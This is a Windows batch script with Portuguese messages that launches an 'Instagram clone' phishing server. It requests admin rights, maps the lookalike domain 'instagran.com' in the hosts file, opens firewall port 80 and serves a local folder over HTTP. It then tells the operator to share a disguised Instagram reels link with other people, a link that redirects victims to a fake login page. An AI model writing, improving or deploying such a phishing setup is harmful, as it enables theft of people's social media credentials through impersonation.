@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Solicitando privilegios de administrador...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)

echo ========================================
echo    SERVIDOR INSTAGRAM CLONE
echo ========================================
echo.
echo Configurando dominio local...

findstr /C:"instagran.com" C:\Windows\System32\drivers\etc\hosts >nul
if %errorLevel% neq 0 (
    echo 127.0.0.1 instagran.com >> C:\Windows\System32\drivers\etc\hosts
)

echo Liberando firewall...
netsh advfirewall firewall delete rule name="Instagram Clone Server" >nul 2>&1
netsh advfirewall firewall add rule name="Instagram Clone Server" dir=in action=allow protocol=TCP localport=80 >nul 2>&1

for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4"') do set IP=%%a
set IP=%IP:~1%

echo Dominio configurado!
echo.
echo ========================================
echo SERVIDOR RODANDO!
echo ========================================
echo.
echo [VOCE] Acesse: http://instagran.com/login
echo.
echo [OUTRAS PESSOAS] Compartilhe este link:
echo http://%IP%/reels/DVYc2zqidaM/
echo.
echo O link vai redirecionar para a pagina de login!
echo ========================================
echo.
cd /d "%~dp0"
python -m http.server 80 --bind 0.0.0.0
pause
